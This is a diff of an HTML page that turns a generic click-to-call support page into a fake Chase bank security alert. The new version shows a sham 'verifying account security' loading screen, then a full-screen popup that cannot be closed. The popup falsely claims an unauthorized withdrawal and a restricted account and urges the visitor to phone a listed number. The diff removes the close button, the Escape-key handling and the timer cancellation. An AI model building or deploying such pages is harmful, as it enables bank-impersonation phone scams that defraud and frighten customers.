@@ -3,150 +3,165 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Customer Support | 24/7 Assistance</title>
-  <meta name="description" content="Get immediate help from our customer support team. Available 24/7 for your convenience.">
+  <title>Chase Account Security Verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    :root {
-      --primary-color: #28a745;
-      --primary-hover: #218838;
-      --alert-color: #b30000;
-      --text-color: #333;
-      --light-text: #666;
-      --background: #ffffff;
-      --overlay: rgba(0,0,0,0.6);
-    }
-    
     * {
-      box-sizing: border-box;
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
     
     body {
-      font-family: Arial, sans-serif;
-      background: var(--background);
-      color: var(--text-color);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
+      background: linear-gradient(135deg, #1a3a1f 0%, #2c5c2f 100%);
+      color: #333;
       min-height: 100vh;
-      text-align: center;
-      padding: 20px;
-      line-height: 1.6;
+      position: relative;
+      overflow: hidden;
     }
     
-    .container {
-      max-width: 600px;
-      width: 100%;
-      padding: 20px;
-    }
-    
-    h1 {
-      font-size: 28px;
-      margin-bottom: 20px;
-      color: var(--text-color);
-    }
-    
-    .call-btn {
-      display: inline-block;
-      font-size: 20px;
-      color: white;
-      background-color: var(--primary-color);
-      padding: 15px 30px;
-      text-decoration: none;
-      border-radius: 8px;
-      margin: 10px 0;
-      transition: background-color 0.3s, transform 0.2s;
-      font-weight: bold;
-    }
-    
-    .call-btn:hover, .call-btn:focus {
-      background-color: var(--primary-hover);
-      transform: translateY(-2px);
-    }
-    
-    .call-btn:active {
-      transform: translateY(0);
-    }
-    
-    p {
-      margin-top: 15px;
-      font-size: 16px;
-      color: var(--light-text);
-    }
-    
-    /* Popup styles */
-    #popup {
-      display: none;
+    .loading-screen {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: var(--overlay);
-      z-index: 1000;
+      background: rgba(0, 0, 0, 0.95);
+      display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
-      padding: 20px;
-      animation: fadeIn 0.3s ease;
+      z-index: 2000;
+      color: white;
     }
     
-    #popup .content {
-      background: var(--background);
-      padding: 30px;
-      max-width: 450px;
-      width: 100%;
-      border-radius: 10px;
+    .loader {
+      width: 80px;
+      height: 80px;
+      border: 8px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 8px solid #28a745;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    .loading-text {
+      font-size: 24px;
       text-align: center;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-      position: relative;
+      margin-bottom: 10px;
     }
     
-    #close-popup {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      background: none;
-      border: none;
+    .loading-text span {
+      color: #28a745;
+      font-weight: bold;
+    }
+    
+    .loading-subtext {
+      font-size: 16px;
+      opacity: 0.8;
+      margin-bottom: 30px;
+    }
+    
+    .progress-bar {
+      width: 300px;
+      height: 10px;
+      background: #444;
+      border-radius: 5px;
+      margin-top: 20px;
+      overflow: hidden;
+    }
+    
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: #28a745;
+      animation: progress 5s linear;
+    }
+    
+    /* Popup styles */
+    #security-popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.98);
+      z-index: 3000;
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.5s ease;
+      flex-direction: column;
+      color: white;
+    }
+    
+    #security-popup .content {
+      background: linear-gradient(135deg, #1a1a1a 0%, #2c2c2c 100%);
+      padding: 40px;
+      max-width: 600px;
+      width: 90%;
+      border-radius: 15px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      border: 1px solid #444;
+      animation: scaleIn 0.5s ease;
+    }
+    
+    #security-popup h2 {
+      color: #ff4d4d;
+      margin-bottom: 20px;
+      font-size: 28px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    #security-popup .alert-icon {
+      font-size: 60px;
+      margin-bottom: 20px;
+      color: #ff4d4d;
+      animation: pulse 1.5s infinite;
+    }
+    
+    #security-popup .urgent-text {
+      color: #ff4d4d;
+      font-weight: bold;
       font-size: 22px;
-      cursor: pointer;
-      color: var(--light-text);
+      margin: 20px 0;
+      text-transform: uppercase;
     }
     
-    #popup h2 {
-      color: var(--alert-color);
-      margin-bottom: 15px;
+    #security-popup p {
+      margin: 15px 0;
+      line-height: 1.6;
+      font-size: 18px;
     }
     
-    #popup a {
+    #popup-call-btn {
       display: inline-block;
-      margin-top: 15px;
-      padding: 12px 25px;
-      background: var(--primary-color);
+      margin-top: 25px;
+      padding: 18px 35px;
+      background: #ff4d4d;
       color: white;
       text-decoration: none;
-      border-radius: 6px;
-      font-size: 16px;
-      transition: background-color 0.3s;
-    }
-    
-    #popup a:hover, #popup a:focus {
-      background: var(--primary-hover);
-    }
-    
-    /* Blinking alert effect */
-    .alert-text {
-      color: var(--alert-color);
+      border-radius: 8px;
+      font-size: 22px;
       font-weight: bold;
-      font-size: 16px;
-      margin: 15px 0;
-      animation: blink 1.5s infinite;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      transition: background 0.3s ease;
+      border: none;
+      cursor: pointer;
     }
     
-    @keyframes blink {
-      0%, 50%, 100% { opacity: 1; }
-      25%, 75% { opacity: 0.7; }
+    #popup-call-btn:hover {
+      background: #e60000;
+      transform: scale(1.05);
+    }
+    
+    .contact-info {
+      margin-top: 25px;
+      font-size: 16px;
+      opacity: 0.9;
     }
     
     @keyframes fadeIn {
@@ -154,120 +169,108 @@
       to { opacity: 1; }
     }
     
-    /* Footer styles */
-    footer {
-      margin-top: 40px;
-      font-size: 12px;
-      color: var(--light-text);
+    @keyframes scaleIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
     }
     
-    /* Responsive adjustments */
-    @media (max-width: 480px) {
-      h1 {
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes progress {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    
+    @media (max-width: 600px) {
+      .loading-text {
+        font-size: 20px;
+        padding: 0 15px;
+      }
+      
+      .loading-subtext {
+        font-size: 14px;
+        padding: 0 15px;
+      }
+      
+      .progress-bar {
+        width: 250px;
+      }
+      
+      #security-popup .content {
+        padding: 25px 20px;
+      }
+      
+      #security-popup h2 {
         font-size: 22px;
       }
       
-      .call-btn {
-        font-size: 18px;
-        padding: 12px 25px;
+      #security-popup p {
+        font-size: 16px;
       }
       
-      #popup .content {
-        padding: 20px 15px;
+      #popup-call-btn {
+        font-size: 18px;
+        padding: 15px 25px;
       }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Click to Call Customer Support</h1>
-    <a href="tel:+1-806-535-3270" class="call-btn" aria-label="Call customer support at 8 0 6, 5 3 5, 3 2 7 0">Call Now: +1-806-535-3270</a>
-    <p>Our customer service team is available 24/7 to assist you</p>
-  </div>
 
-  <!-- Popup Modal -->
-  <div id="popup" role="dialog" aria-labelledby="popupHeading" aria-modal="true">
-    <div class="content">
-      <button id="close-popup" aria-label="Close notification">×</button>
-      <h2 id="popupHeading">Important Security Notice</h2>
-      <p class="alert-text">
-        We've detected unusual activity that may require verification
-      </p>
-      <p>For your protection, please contact our support team to verify your account:</p>
-      <a href="tel:+1-806-535-3270">📞 Call Support: +1-806-535-3270</a>
+  <div class="loading-screen">
+    <div class="loader"></div>
+    <div class="loading-text">Verifying your account security<span>...</span></div>
+    <div class="loading-subtext">Please wait while we analyze your account activity</div>
+    <div class="progress-bar">
+      <div class="progress"></div>
     </div>
   </div>
 
-  <footer>
-    <p>© 2023 Customer Support. All rights reserved.</p>
-  </footer>
-
-  <!-- Statcounter Code for games -->
-  <script type="text/javascript">
-  var sc_project=13157096; 
-  var sc_invisible=1; 
-  var sc_security="d9ee045d"; 
-  </script>
-  <script type="text/javascript"
-  src="https://www.statcounter.com/counter/counter.js"
-  async></script>
-  <noscript><div class="statcounter"><a title="free web stats"
-  href="https://statcounter.com/" target="_blank"><img
-  class="statcounter"
-  src="https://c.statcounter.com/13157096/0/d9ee045d/1/"
-  alt="free web stats"
-  referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-  <!-- End of Statcounter Code -->
-
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-VCBLXTQNVQ');
-  </script>
+  <!-- Security Alert Popup -->
+  <div id="security-popup">
+    <div class="content">
+      <div class="alert-icon">
+        <i class="fas fa-exclamation-triangle"></i>
+      </div>
+      <h2>Security Alert</h2>
+      <p class="urgent-text">Withdrawal activity detected from a different device!</p>
+      <p>We've detected an unauthorized withdrawal attempt from a new device.</p>
+      <p>For your security, we've temporarily restricted access to your account.</p>
+      <p>Please verify your identity immediately with our security team to prevent any transactions.</p>
+      
+      <a id="popup-call-btn" href="tel:+1-828-280-2950">
+        <i class="fas fa-phone"></i> CALL CHASE NOW: +1-828-280-2950
+      </a>
+      
+      <div class="contact-info">
+        <p>Available 24/7 • Quick Response • Verified Security Team</p>
+      </div>
+    </div>
+  </div>
 
   <script>
-    // Show popup after a delay or when user attempts to leave
+    // Show loading screen with timer, then show the full-screen popup
     document.addEventListener('DOMContentLoaded', function() {
-      const popup = document.getElementById('popup');
-      const closeBtn = document.getElementById('close-popup');
+      const loadingScreen = document.querySelector('.loading-screen');
+      const popup = document.getElementById('security-popup');
       
-      // Show popup after 5 seconds instead of 3
-      const popupTimer = setTimeout(function(){
+      // After 5 seconds, hide loading screen and show popup
+      setTimeout(function() {
+        loadingScreen.style.display = 'none';
         popup.style.display = "flex";
+        document.body.style.overflow = 'hidden';
       }, 5000);
-      
-      // Close popup functionality
-      closeBtn.addEventListener('click', function() {
-        popup.style.display = "none";
-      });
-      
-      // Close when clicking outside content
-      popup.addEventListener('click', function(e) {
-        if (e.target === popup) {
-          popup.style.display = "none";
-        }
-      });
-      
-      // Close with Escape key
-      document.addEventListener('keydown', function(e) {
-        if (e.key === "Escape" && popup.style.display === "flex") {
-          popup.style.display = "none";
-        }
-      });
-      
-      // Clear timer if user interacts with page
-      const clearPopupTimer = function() {
-        clearTimeout(popupTimer);
-        document.removeEventListener('click', clearPopupTimer);
-        document.removeEventListener('scroll', clearPopupTimer);
-      };
-      
-      document.addEventListener('click', clearPopupTimer);
-      document.addEventListener('scroll', clearPopupTimer);
     });
   </script>
+
 </body>
 </html>
